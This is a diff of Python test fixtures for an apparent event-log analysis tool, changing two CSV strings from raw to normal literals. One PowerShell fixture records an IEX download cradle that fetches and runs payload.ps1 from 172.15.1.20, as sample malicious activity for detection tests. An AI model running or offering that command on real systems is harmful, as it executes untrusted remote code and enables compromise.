@@ -27,7 +27,7 @@ from mcp_server.tools.event_logs import (
 
 # ── CSV fixtures ──────────────────────────────────────────────────────────────
 
-CLEAN_CSV = r"""\
+CLEAN_CSV = """\
 Channel,Computer,EventId,TimeCreated,UserId,UserName,MapDescription,PayloadData1,PayloadData2,PayloadData3,PayloadData4,PayloadData5,PayloadData6,ExecutableInfo,RemoteHost,Keywords,RecordNumber,SourceFile
 Security,WORKSTATION1,4624,2024-03-01 09:00:00,S-1-5-18,SYSTEM,Logon success,LogonType: 2,SubjectUserName: WORKSTATION1$,,,,,,,,1001,C:\Windows\System32\winevt\Logs\Security.evtx
 Security,WORKSTATION1,4688,2024-03-01 09:05:00,S-1-5-21-123,jsmith,A new process has been created,ProcessName: C:\Windows\System32\notepad.exe,CommandLine: notepad.exe test.txt,,,,,,,,1002,C:\Windows\System32\winevt\Logs\Security.evtx
@@ -42,7 +42,7 @@ SUSPICIOUS_CSV = (
     "Security,WORKSTATION1,4624,2024-03-15 14:15:00,S-1-5-21-456,attacker,Logon success,LogonType: 10,SubjectUserName: attacker,,,,,,172.15.1.20,,1007,Security.evtx\n"
 )
 
-POWERSHELL_CSV = r"""\
+POWERSHELL_CSV = """\
 Channel,Computer,EventId,TimeCreated,UserId,UserName,MapDescription,PayloadData1,PayloadData2,PayloadData3,PayloadData4,PayloadData5,PayloadData6,ExecutableInfo,RemoteHost,Keywords,RecordNumber,SourceFile
 PowerShell,WORKSTATION1,4104,2024-03-15 15:00:00,S-1-5-21-123,jsmith,Script block logging,ScriptBlock: IEX (New-Object Net.WebClient).DownloadString('http://172.15.1.20/payload.ps1'),,,,,,,,,,1008,C:\Windows\System32\winevt\Logs\PowerShell.evtx
 """
